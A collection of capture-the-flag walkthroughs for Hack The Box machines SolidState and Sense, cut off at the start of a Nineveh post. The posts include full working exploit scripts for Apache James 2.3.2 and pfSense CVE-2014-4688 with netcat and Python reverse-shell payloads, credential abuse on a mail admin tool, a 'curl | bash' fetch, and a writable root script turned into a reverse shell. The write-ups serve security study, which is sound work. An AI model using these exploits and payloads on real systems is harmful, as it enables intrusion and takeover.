[{"content":"Enumeration 1  nmap -sC -sV -vv 10.10.10.51 -oN solidstate_scan   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0) | ssh-hostkey: | 2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCp5WdwlckuF4slNUO29xOk/Yl/cnXT/p6qwezI0ye+4iRSyor8lhyAEku/yz8KJXtA+ALhL7HwYbD3hDUxDkFw90V1Omdedbk7SxUVBPK2CiDpvXq1+r5fVw26WpTCdawGKkaOMYoSWvliBsbwMLJEUwVbZ/GZ1SUEswpYkyZeiSC1qk72L6CiZ9/5za4MTZw8Cq0akT7G+mX7Qgc+5eOEGcqZt3cBtWzKjHyOZJAEUtwXAHly29KtrPUddXEIF0qJUxKXArEDvsp7OkuQ0fktXXkZuyN/GRFeu3im7uQVuDgiXFKbEfmoQAsvLrR8YiKFUG6QBdI9awwmTkLFbS1Z | 256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBISyhm1hXZNQl3cslogs5LKqgWEozfjs3S3aPy4k3riFb6UYu6Q1QsxIEOGBSPAWEkevVz1msTrRRyvHPiUQ+eE= | 256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMKbFbK3MJqjMh9oEw/2OVe0isA7e3ruHz5fhUP4cVgY 25/tcp open smtp syn-ack ttl 63 JAMES smtpd 2.3.2 |_smtp-commands: solidstate Hello nmap.scanme.org (10.10.14.31 [10.10.14.31]), PIPELINING, ENHANCEDSTATUSCODES 80/tcp open http syn-ack ttl 63 Apache httpd 2.4.25 ((Debian)) | http-methods: |_ Supported Methods: HEAD GET POST OPTIONS |_http-title: Home - Solid State Security |_http-server-header: Apache/2.4.25 (Debian) 110/tcp open pop3 syn-ack ttl 63 JAMES pop3d 2.3.2 119/tcp open nntp syn-ack ttl 63 JAMES nntpd (posting ok) Service Info: Host: solidstate; OS: Linux; CPE: cpe:/o:linux:linux_kernel   1  nmap -p- -sC -sV 10.10.10.51 -oN solidstate_scan_2   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32  PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0) | ssh-hostkey: | 2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA) | 256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA) |_ 256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519) 25/tcp open smtp JAMES smtpd 2.3.2 |_smtp-commands: solidstate Hello solidstate.htb (10.10.14.31 [10.10.14.31]), PIPELINING, ENHANCEDSTATUSCODES 80/tcp open http Apache httpd 2.4.25 ((Debian)) |_http-title: Home - Solid State Security |_http-server-header: Apache/2.4.25 (Debian) 110/tcp open pop3 JAMES pop3d 2.3.2 |_ssl-date: ERROR: Script execution failed (use -d to debug) |_sslv2: ERROR: Script execution failed (use -d to debug) |_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug) |_ssl-cert: ERROR: Script execution failed (use -d to debug) |_tls-alpn: ERROR: Script execution failed (use -d to debug) 119/tcp open nntp JAMES nntpd (posting ok) |_sslv2: ERROR: Script execution failed (use -d to debug) |_ssl-cert: ERROR: Script execution failed (use -d to debug) |_ssl-date: ERROR: Script execution failed (use -d to debug) |_tls-alpn: ERROR: Script execution failed (use -d to debug) |_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug) 4555/tcp open rsip? | fingerprint-strings: | GenericLines: | JAMES Remote Administration Tool 2.3.2 | Please enter your login and password | Login id: | Password: | Login failed for |_ Login id:   Directory Enumeration 1  gobuster dir -u http://10.10.10.51/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -n   1 2 3  /images [Size: 311] [--\u0026gt; http://10.10.10.51/images/] /assets [Size: 311] [--\u0026gt; http://10.10.10.51/assets/] /server-status [Size: 299]    Nothing really interesting scanning directories Let’s connect to the strange port running on 4555 Google searched for james default creds and tried root:root  Interacting with the port 4555\n1 2 3 4 5 6  nc 10.10.10.51 4555 root root help    Available commands  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  Welcome root. HELP for a list of commands help Currently implemented commands: help display this help listusers display existing accounts countusers display the number of existing accounts adduser [username] [password] add a new user verify [username] verify if specified user exist deluser [username] delete existing user setpassword [username] [password] sets a user\u0026#39;s password setalias [user] [alias] locally forwards all email for \u0026#39;user\u0026#39; to \u0026#39;alias\u0026#39; showalias [username] shows a user\u0026#39;s current email alias unsetalias [user] unsets an alias for \u0026#39;user\u0026#39; setforwarding [username] [emailaddress] forwards a user\u0026#39;s email to another email address showforwarding [username] shows a user\u0026#39;s current email forwarding unsetforwarding [username] removes a forward user [repositoryname] change to another user repository shutdown kills the current JVM (convenient when James is run as a daemon) quit close connection   1 2 3 4 5 6 7 8  listusers --- Existing accounts 5 user: james user: thomas user: john user: mindy user: mailadmin    Let’s set a password for the listed users  1 2 3 4 5 6 7  setpassword mindy password123 setpassword john password123 setpassword thomas password123 setpassword james password123   POP3 port 110 (Interacting with Telnet)  Interacting with POP3 port 110 Useful article to interact with telnet → https://www.shellhacks.com/retrieve-email-pop3-server-command-line/  Checking User: mindy\n1 2 3 4  telnet 10.10.10.51 110 USER mindy PASS password123   1 2 3 4 5 6  list --- 1 1109 2 836 ---   1 2 3 4 5 6 7 8 9 10 11 12 13 14  retr 1 --- From: mailadmin@localhost Subject: Welcome Dear Mindy, Welcome to Solid State Security Cyber team! We are delighted you are joining us as a junior defense analyst. Your role is critical in fulfilling the mission of our orginzation. The enclosed information is designed to serve as an introduction to Cyber Security and provide resources that will help you make a smooth transition into your new role. The Cyber team is here to support your transition so, please know that you can call on any of us to assist you. We are looking forward to you joining our team and your success at Solid State Security. Respectfully, James ---   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49  retr 2 --- Return-Path: \u0026lt;mailadmin@localhost\u0026gt; Message-ID: \u0026lt;16744123.2.1503422270399.JavaMail.root@solidstate\u0026gt; MIME-Version: 1.0 Content-Type: text/plain; charset=us-ascii Content-Transfer-Encoding: 7bit Delivered-To: mindy@localhost Received: from 192.168.11.142 ([192.168.11.142]) by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581 for \u0026lt;mindy@localhost\u0026gt;; Tue, 22 Aug 2017 13:17:28 -0400 (EDT) Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT) From: mailadmin@localhost Subject: Your Access Dear Mindy, Here are your ssh credentials to access the system. Remember to reset your password after your first login. Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. username: mindy pass: P@55W0rd1!2@ Respectfully, JamesReturn-Path: \u0026lt;mailadmin@localhost\u0026gt; Message-ID: \u0026lt;5420213.0.1503422039826.JavaMail.root@solidstate\u0026gt; MIME-Version: 1.0 Content-Type: text/plain; charset=us-ascii Content-Transfer-Encoding: 7bit Delivered-To: mindy@localhost Received: from 192.168.11.142 ([192.168.11.142]) by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 798 for \u0026lt;mindy@localhost\u0026gt;; Tue, 22 Aug 2017 13:13:42 -0400 (EDT) Date: Tue, 22 Aug 2017 13:13:42 -0400 (EDT) From: mailadmin@localhost Subject: Welcome Dear Mindy, Welcome to Solid State Security Cyber team! We are delighted you are joining us as a junior defense analyst. Your role is critical in fulfilling the mission of our orginzation. The enclosed information is designed to serve as an introduction to Cyber Security and provide resources that will help you make a smooth transition into your new role. The Cyber team is here to support your transition so, please know that you can call on any of us to assist you. We are looking forward to you joining our team and your success at Solid State Security. Respectfully, James ---    In the second email we have a ssh credentials username: mindy pass: P@55W0rd1!2@  Checking User: john\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33  telnet 10.10.10.51 110 USER john PASS password123 list +OK 1 743 1 743 retr 1 +OK Message follows Return-Path: \u0026lt;mailadmin@localhost\u0026gt; Message-ID: \u0026lt;9564574.1.1503422198108.JavaMail.root@solidstate\u0026gt; MIME-Version: 1.0 Content-Type: text/plain; charset=us-ascii Content-Transfer-Encoding: 7bit Delivered-To: john@localhost Received: from 192.168.11.142 ([192.168.11.142]) by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581 for \u0026lt;john@localhost\u0026gt;; Tue, 22 Aug 2017 13:16:20 -0400 (EDT) Date: Tue, 22 Aug 2017 13:16:20 -0400 (EDT) From: mailadmin@localhost Subject: New Hires access John, Can you please restrict mindy\u0026#39;s access until she gets read on to the program. Also make sure that you send her a tempory password to login to her accounts. Thank you in advance. Respectfully, James   Checking user: thomas\n1 2 3 4 5 6 7 8 9 10 11 12  telnet 10.10.10.51 110 Trying 10.10.10.51... Connected to 10.10.10.51. Escape character is \u0026#39;^]\u0026#39;. USER thomas +OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready +OK PASS password123 +OK Welcome thomas list +OK 0 0   Checking user: james\n1 2 3 4 5 6 7 8 9 10 11 12  telnet 10.10.10.51 110 Trying 10.10.10.51... Connected to 10.10.10.51. Escape character is \u0026#39;^]\u0026#39;. +OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready USER james +OK PASS password123 +OK Welcome james list +OK 0 0   SSH\n Let’s ssh to user mindy with the credentials we found mindy | P@55W0rd1!2@  1 2  cat user.txt -\u0026gt; ********************************    We have a restricted shell but we can\u0026rsquo;t cat and get the user flag  Exploitation  Found this exploit → https://www.exploit-db.com/exploits/50347 Using the payload available I named the file 50347.py  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77  #!/usr/bin/python3 import socket import sys import time # credentials to James Remote Administration Tool (Default - root/root) user = \u0026#39;root\u0026#39; pwd = \u0026#39;root\u0026#39; if len(sys.argv) != 4: sys.stderr.write(\u0026#34;[-]Usage: python3 %s\u0026lt;remote ip\u0026gt; \u0026lt;local ip\u0026gt; \u0026lt;local listener port\u0026gt;\\n\u0026#34; % sys.argv[0]) sys.stderr.write(\u0026#34;[-]Example: python3 %s172.16.1.66 172.16.1.139 443\\n\u0026#34; % sys.argv[0]) sys.stderr.write(\u0026#34;[-]Note: The default payload is a basic bash reverse shell - check script for details and other options.\\n\u0026#34;) sys.exit(1) remote_ip = sys.argv[1] local_ip = sys.argv[2] port = sys.argv[3] # Select payload prior to running script - default is a reverse shell executed upon any user logging in (i.e. via SSH) payload = \u0026#39;nc -e /bin/sh 10.10.14.31 1234\u0026#39; # Change to your own ip address and set the port you like #payload = \u0026#39;nc -e /bin/sh \u0026#39; + local_ip + \u0026#39; \u0026#39; + port # basic netcat reverse shell #payload = \u0026#39;echo $USER \u0026amp;\u0026amp; cat /etc/passwd \u0026amp;\u0026amp; ping -c 4 \u0026#39; + local_ip # test remote command execution capabilities and connectivity #payload = \u0026#39;[ \u0026#34;$(id -u)\u0026#34; == \u0026#34;0\u0026#34; ] \u0026amp;\u0026amp; touch /root/proof.txt\u0026#39; # proof of concept exploit on root user login only print (\u0026#34;[+]Payload Selected (see script for more options): \u0026#34;, payload) if \u0026#39;/bin/bash\u0026#39; in payload: print (\u0026#34;[+]Example netcat listener syntax to use after successful execution: nc -lvnp\u0026#34;, port) def recv(s): s.recv(1024) time.sleep(0.2) try: print (\u0026#34;[+]Connecting to James Remote Administration Tool...\u0026#34;) s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) s.connect((remote_ip,4555)) # Assumes James Remote Administration Tool is running on Port 4555, change if necessary. s.recv(1024) s.send((user + \u0026#34;\\n\u0026#34;).encode(\u0026#39;utf-8\u0026#39;)) s.recv(1024) s.send((pwd + \u0026#34;\\n\u0026#34;).encode(\u0026#39;utf-8\u0026#39;)) s.recv(1024) print (\u0026#34;[+]Creating user...\u0026#34;) s.send(\u0026#34;adduser ../../../../../../../../etc/bash_completion.d exploit\\n\u0026#34;.encode(\u0026#39;utf-8\u0026#39;)) s.recv(1024) s.send(\u0026#34;quit\\n\u0026#34;.encode(\u0026#39;utf-8\u0026#39;)) s.close() print (\u0026#34;[+]Connecting to James SMTP server...\u0026#34;) s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) s.connect((remote_ip,25)) # Assumes default SMTP port, change if necessary. s.send(\u0026#34;ehlo team@team.pl\\r\\n\u0026#34;.encode(\u0026#39;utf-8\u0026#39;)) recv(s) print (\u0026#34;[+]Sending payload...\u0026#34;) s.send(\u0026#34;mail from: \u0026lt;\u0026#39;@team.pl\u0026gt;\\r\\n\u0026#34;.encode(\u0026#39;utf-8\u0026#39;)) recv(s) # also try s.send(\u0026#34;rcpt to: \u0026lt;../../../../../../../../etc/bash_completion.d@hostname\u0026gt;\\r\\n\u0026#34;.encode(\u0026#39;utf-8\u0026#39;)) if the recipient cannot be found s.send(\u0026#34;rcpt to: \u0026lt;../../../../../../../../etc/bash_completion.d\u0026gt;\\r\\n\u0026#34;.encode(\u0026#39;utf-8\u0026#39;)) recv(s) s.send(\u0026#34;data\\r\\n\u0026#34;.encode(\u0026#39;utf-8\u0026#39;)) recv(s) s.send(\u0026#34;From: team@team.pl\\r\\n\u0026#34;.encode(\u0026#39;utf-8\u0026#39;)) s.send(\u0026#34;\\r\\n\u0026#34;.encode(\u0026#39;utf-8\u0026#39;)) s.send(\u0026#34;\u0026#39;\\n\u0026#34;.encode(\u0026#39;utf-8\u0026#39;)) s.send((payload + \u0026#34;\\n\u0026#34;).encode(\u0026#39;utf-8\u0026#39;)) s.send(\u0026#34;\\r\\n.\\r\\n\u0026#34;.encode(\u0026#39;utf-8\u0026#39;)) recv(s) s.send(\u0026#34;quit\\r\\n\u0026#34;.encode(\u0026#39;utf-8\u0026#39;)) recv(s) s.close() print (\u0026#34;[+]Done! Payload will be executed once somebody logs in (i.e. via SSH).\u0026#34;) if \u0026#39;/bin/bash\u0026#39; in payload: print (\u0026#34;[+]Don\u0026#39;t forget to start a listener on port\u0026#34;, port, \u0026#34;before logging in!\u0026#34;) except: print (\u0026#34;Connection failed.\u0026#34;)   1 2 3 4 5 6 7 8  python3 50347.py 10.10.10.51 10.10.14.31 4555 [+]Payload Selected (see script for more options): nc -e /bin/sh 10.10.14.31 1234 [+]Connecting to James Remote Administration Tool... [+]Creating user... [+]Connecting to James SMTP server... [+]Sending payload... [+]Done! Payload will be executed once somebody logs in (i.e. via SSH).    You can also use this payload 35513.py → https://www.exploit-db.com/exploits/35513 Just modify the payload and run  1 2 3 4 5 6 7  python 35513.py 10.10.10.51 [+]Connecting to James Remote Administration Tool... [+]Creating user... [+]Connecting to James SMTP server... [+]Sending payload... [+]Done! Payload will be executed once somebody logs in.    Let’s login again throguh ssh mindy | P@55W0rd1!2@ Make sure to do  1 2 3  nc -lvnp 1234 # Make sure to start listener with the port you specified in the payload ssh mindy@10.10.10.51   Interactive Shell\n1 2 3 4 5 6 7 8 9 10 11  which python python -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; CTRL + Z stty raw -echo fg [Press Enter] export TERM=screen   Alternative way to connect mindy with bash shell\n1  ssh mindy@10.10.10.51 bash # we can run regular commands   Privilege Escalation  Further scan with linpeas → https://github.com/carlospolop/PEASS-ng/releases  1 2 3  python3 -m http.server curl http://10.10.14.31:8000/linpeas.sh | bash    In our scan we didn’t find port 631. This might be interesting to look at  1 2 3 4 5 6 7 8 9 10 11 12 13  cd /opt cat tmp.py --- #!/usr/bin/env python import os import sys try: os.system(\u0026#39;rm -r /tmp/* \u0026#39;) except: sys.exit() ---    Check if we have permission to write to tmp.py We can also use → https://github.com/DominicBreuker/pspy to scan the machine to see running processes on linux machines Download the pspy32 (You can determine it by typing [uname -m]) The linux machine’s architecture is i686 which is a 32bit  1 2 3 4 5  wget http://10.10.14.31:8000/pspy32 chmod +x pspy32 ./pspy32    We verified that there is a process going running on root /opt/tmp.py  Fixing the columns in bash terminal\n1 2 3  stty -a stty rows 36 columns 37   1 2 3 4 5 6 7 8  #!/usr/bin/env python import os import sys try: os.system(\u0026#39;nc -e /bin/sh 10.10.14.31 8080\u0026#39;) except: sys.exit()   1  nc -lvnp 8080    We will get the reverse shell in couple seconds  Skills Learned  Exploiting Apache James Enumerating POP servers Chaining vulnerabilities Exploiting world-writable files  ","description":"SolidState is a medium difficulty machine that requires chaining of multiple attack vectors in order to get a privileged shell. As a note, in some cases the exploit may fail to trigger more than once and a machine reset is required.","id":0,"section":"posts","tags":["OSCP","Apache James","POP","Web","Vulnerability Assessment","Outdated Software","Python","Default Credentials","Weak Permissions"],"title":"Hackthebox - Solidstate","uri":"https://hswootan.github.io/en/posts/solidstate/"},{"content":"Enumeration 1  nmap -sC -sV -vv 10.10.10.60 -oN sense   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47  PORT STATE SERVICE REASON VERSION 80/tcp open http syn-ack ttl 63 lighttpd 1.4.35 |_http-title: Did not follow redirect to https://10.10.10.60/ | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: lighttpd/1.4.35 443/tcp open ssl/http syn-ack ttl 63 lighttpd 1.4.35 | ssl-cert: Subject: commonName=Common Name (eg, YOUR name)/organizationName=CompanyName/stateOrProvinceName=Somewhere/countryName=US/emailAddress=Email Address/organizationalUnitName=Organizational Unit Name (eg, section)/localityName=Somecity | Issuer: commonName=Common Name (eg, YOUR name)/organizationName=CompanyName/stateOrProvinceName=Somewhere/countryName=US/emailAddress=Email Address/organizationalUnitName=Organizational Unit Name (eg, section)/localityName=Somecity | Public Key type: rsa | Public Key bits: 1024 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2017-10-14T19:21:35 | Not valid after: 2023-04-06T19:21:35 | MD5: 65f8 b00f 57d2 3468 2c52 0f44 8110 c622 | SHA-1: 4f7c 9a75 cb7f 70d3 8087 08cb 8c27 20dc 05f1 bb02 | -----BEGIN CERTIFICATE----- | MIIEKDCCA5GgAwIBAgIJALChaIpiwz41MA0GCSqGSIb3DQEBCwUAMIG/MQswCQYD | VQQGEwJVUzESMBAGA1UECBMJU29tZXdoZXJlMREwDwYDVQQHEwhTb21lY2l0eTEU | MBIGA1UEChMLQ29tcGFueU5hbWUxLzAtBgNVBAsTJk9yZ2FuaXphdGlvbmFsIFVu | aXQgTmFtZSAoZWcsIHNlY3Rpb24pMSQwIgYDVQQDExtDb21tb24gTmFtZSAoZWcs | IFlPVVIgbmFtZSkxHDAaBgkqhkiG9w0BCQEWDUVtYWlsIEFkZHJlc3MwHhcNMTcx | MDE0MTkyMTM1WhcNMjMwNDA2MTkyMTM1WjCBvzELMAkGA1UEBhMCVVMxEjAQBgNV | BAgTCVNvbWV3aGVyZTERMA8GA1UEBxMIU29tZWNpdHkxFDASBgNVBAoTC0NvbXBh | bnlOYW1lMS8wLQYDVQQLEyZPcmdhbml6YXRpb25hbCBVbml0IE5hbWUgKGVnLCBz | ZWN0aW9uKTEkMCIGA1UEAxMbQ29tbW9uIE5hbWUgKGVnLCBZT1VSIG5hbWUpMRww | GgYJKoZIhvcNAQkBFg1FbWFpbCBBZGRyZXNzMIGfMA0GCSqGSIb3DQEBAQUAA4GN | ADCBiQKBgQC/sWU6By08lGbvttAfx47SWksgA7FavNrEoW9IRp0W/RF9Fp5BQesL | L3FMJ0MHyGcfRhnL5VwDCL0E+1Y05az8PY8kUmjvxSvxQCLn6Mh3nTZkiAJ8vpB0 | WAnjltrTCEsv7Dnz2OofkpqaUnoNGfO3uKWPvRXl9OlSe/BcDStffQIDAQABo4IB | KDCCASQwHQYDVR0OBBYEFDK5DS/hTsi9SHxT749Od/p3Lq05MIH0BgNVHSMEgeww | gemAFDK5DS/hTsi9SHxT749Od/p3Lq05oYHFpIHCMIG/MQswCQYDVQQGEwJVUzES | MBAGA1UECBMJU29tZXdoZXJlMREwDwYDVQQHEwhTb21lY2l0eTEUMBIGA1UEChML | Q29tcGFueU5hbWUxLzAtBgNVBAsTJk9yZ2FuaXphdGlvbmFsIFVuaXQgTmFtZSAo | ZWcsIHNlY3Rpb24pMSQwIgYDVQQDExtDb21tb24gTmFtZSAoZWcsIFlPVVIgbmFt | ZSkxHDAaBgkqhkiG9w0BCQEWDUVtYWlsIEFkZHJlc3OCCQCwoWiKYsM+NTAMBgNV | HRMEBTADAQH/MA0GCSqGSIb3DQEBCwUAA4GBAHNn+1AX2qwJ9zhgN3I4ES1Vq84l | n6p7OoBefxcf31Pn3VDnbvJJFFcZdplDxbIWh5lyjpTHRJQyHECtEMW677rFXJAl | /cEYWHDndn9Gwaxn7JyffK5lUAPMPEDtudQb3cxrevP/iFZwefi2d5p3jFkDCcGI | +Y0tZRIRzHWgQHa/ |_-----END CERTIFICATE----- |_http-title: Login |_http-favicon: Unknown favicon MD5: 082559A7867CF27ACAB7E9867A8B320F | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_ssl-date: TLS randomness does not represent time |_http-server-header: lighttpd/1.4.35   Directory Enum 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30  /\t200\t7204 index.php\t200\t453 help.php\t200\t453 stats.php\t200\t453 themes\t???\t??? pfsense_ng\t???\t??? javascript\t???\t??? niftyjsCode.js\t200\t5002 csrf\t???\t??? csrf-magic.js\t200\t7511 javascript\t???\t??? jquery.js\t200\t245502 edit.php\t200\t453 license.php\t200\t453 system.php\t200\t453 status.php\t200\t453 changelog.txt\t200\t583 exec.php\t200\t453 graph.php\t200\t453 tree\t200\t8007 tree.js\t200\t5451 wizard.php\t200\t472 pkg.php\t200\t453 installer\t302\t243 index.php\t302\t224 installer.php\t200\t453 xmlrpc.php\t200\t614 reboot.php\t200\t453 interfaces.php\t200\t453 system-users.txt\t200\t394    Potential username: Rohit   Potential password: pfsense_ng , pfsense Correct login info: rohit : pfsense  Exploitation and Privelege Escalation Metasploit 1 2 3  msfconsole search pfsense    I have tried exploit → exploit/unix/http/pfsense_group_member_exec but didn’t work. One reason was because the latest configuration was on 2017 exploit/unix/http/pfsense_group_member_exec worked  1 2 3 4 5 6 7  cd /home/rohit cat user.txt -\u0026gt; ZmxhZ3tOb3RfSW5fSGVyZX0= cd root cat root.txt -\u0026gt; ZmxhZ3tOb3RfSW5fSGVyZX0=   Without Metasploit  https://www.exploit-db.com/exploits/43560  1 2 3  searchsploit 43560 searchsploit   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110  #!/usr/bin/env python3 # Exploit Title: pfSense \u0026lt;= 2.1.3 status_rrd_graph_img.php Command Injection. # Date: 2018-01-12 # Exploit Author: absolomb # Vendor Homepage: https://www.pfsense.org/ # Software Link: https://atxfiles.pfsense.org/mirror/downloads/old/ # Version: \u0026lt;=2.1.3 # Tested on: FreeBSD 8.3-RELEASE-p16 # CVE : CVE-2014-4688 import argparse import requests import urllib import urllib3 import collections \u0026#39;\u0026#39;\u0026#39; pfSense \u0026lt;= 2.1.3 status_rrd_graph_img.php Command Injection. This script will return a reverse shell on specified listener address and port. Ensure you have started a listener to catch the shell before running! \u0026#39;\u0026#39;\u0026#39; parser = argparse.ArgumentParser() parser.add_argument(\u0026#34;--rhost\u0026#34;, help = \u0026#34;Remote Host\u0026#34;) parser.add_argument(\u0026#39;--lhost\u0026#39;, help = \u0026#39;Local Host listener\u0026#39;) parser.add_argument(\u0026#39;--lport\u0026#39;, help = \u0026#39;Local Port listener\u0026#39;) parser.add_argument(\u0026#34;--username\u0026#34;, help = \u0026#34;pfsense Username\u0026#34;) parser.add_argument(\u0026#34;--password\u0026#34;, help = \u0026#34;pfsense Password\u0026#34;) args = parser.parse_args() rhost = args.rhost lhost = args.lhost lport = args.lport username = args.username password = args.password # command to be converted into octal command = \u0026#34;\u0026#34;\u0026#34; python -c \u0026#39;import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\u0026#34;%s\u0026#34;,%s)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\u0026#34;/bin/sh\u0026#34;,\u0026#34;-i\u0026#34;]);\u0026#39; \u0026#34;\u0026#34;\u0026#34; % (lhost, lport) payload = \u0026#34;\u0026#34; # encode payload in octal for char in command: payload += (\u0026#34;\\\\\u0026#34; + oct(ord(char)).lstrip(\u0026#34;0o\u0026#34;)) login_url = \u0026#39;https://\u0026#39; + rhost + \u0026#39;/index.php\u0026#39; exploit_url = \u0026#34;https://\u0026#34; + rhost + \u0026#34;/status_rrd_graph_img.php?database=queues;\u0026#34;+\u0026#34;printf+\u0026#34; + \u0026#34;\u0026#39;\u0026#34; + payload + \u0026#34;\u0026#39;|sh\u0026#34; headers = [ (\u0026#39;User-Agent\u0026#39;,\u0026#39;Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0\u0026#39;), (\u0026#39;Accept\u0026#39;, \u0026#39;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\u0026#39;), (\u0026#39;Accept-Language\u0026#39;, \u0026#39;en-US,en;q=0.5\u0026#39;), (\u0026#39;Referer\u0026#39;,login_url), (\u0026#39;Connection\u0026#39;, \u0026#39;close\u0026#39;), (\u0026#39;Upgrade-Insecure-Requests\u0026#39;, \u0026#39;1\u0026#39;), (\u0026#39;Content-Type\u0026#39;, \u0026#39;application/x-www-form-urlencoded\u0026#39;) ] # probably not necessary but did it anyways headers = collections.OrderedDict(headers) # Disable insecure https connection warning urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) client = requests.session() # try to get the login page and grab the csrf token try: login_page = client.get(login_url, verify=False) index = login_page.text.find(\u0026#34;csrfMagicToken\u0026#34;) csrf_token = login_page.text[index:index+128].split(\u0026#39;\u0026#34;\u0026#39;)[-1] except: print(\u0026#34;Could not connect to host!\u0026#34;) exit() # format login variables and data if csrf_token: print(\u0026#34;CSRF token obtained\u0026#34;) login_data = [(\u0026#39;__csrf_magic\u0026#39;,csrf_token), (\u0026#39;usernamefld\u0026#39;,username), (\u0026#39;passwordfld\u0026#39;,password), (\u0026#39;login\u0026#39;,\u0026#39;Login\u0026#39;) ] login_data = collections.OrderedDict(login_data) encoded_data = urllib.parse.urlencode(login_data) # POST login request with data, cookies and header login_request = client.post(login_url, data=encoded_data, cookies=client.cookies, headers=headers) else: print(\u0026#34;No CSRF token!\u0026#34;) exit() if login_request.status_code == 200: print(\u0026#34;Running exploit...\u0026#34;) # make GET request to vulnerable url with payload. Probably a better way to do this but if the request times out then most likely you have caught the shell try: exploit_request = client.get(exploit_url, cookies=client.cookies, headers=headers, timeout=5) if exploit_request.status_code: print(\u0026#34;Error running exploit\u0026#34;) except: print(\u0026#34;Exploit completed\u0026#34;)   1  nc -lvnp 1234   1  python3 43560.py --rhost 10.10.10.60 --lhost 10.10.14.4 --lport 1234 --username rohit --password pfsense   Skills Learned  Modifying publicly available exploits Bypassing strict filtering Exploiting PFSense  ","description":"Sense, while not requiring many steps to complete, can be challenging for some as the proof of concept exploit that is publicly available is very unreliable. An alternate method using the same vulnerability is required to successfully gain access.","id":1,"section":"posts","tags":["OSCP","freebsd","php","lighthttpd","rce","pfsense"],"title":"Hackthebox - Sense","uri":"https://hswootan.github.io/en/posts/sense/"},{"content":"Enumeration 1  nmap -sV -sC -O -vv 10.10.10.43 -oA nineveh   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49  PORT STATE SERVICE REASON VERSION 80/tcp open http syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu)) |_http-title: Site doesn\u0026#39;t have a title (text/html). | http-methods: |_ Supported Methods: POST OPTIONS GET HEAD |_http-server-header: Apache/2.4.18 (Ubuntu) 443/tcp open ssl/http syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu)) | ssl-cert: Subject: commonName=nineveh.htb/organizationName=HackTheBox Ltd/stateOrProvinceName=Athens/countryName=GR/emailAddress=admin@nineveh.htb/organizationalUnitName=Support/localityName=Athens | Issuer: commonName=nineveh.htb/organizationName=HackTheBox Ltd/stateOrProvinceName=Athens/countryName=GR/emailAddress=admin@nineveh.htb/organizationalUnitName=Support/localityName=Athens | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2017-07-01T15:03:30 | 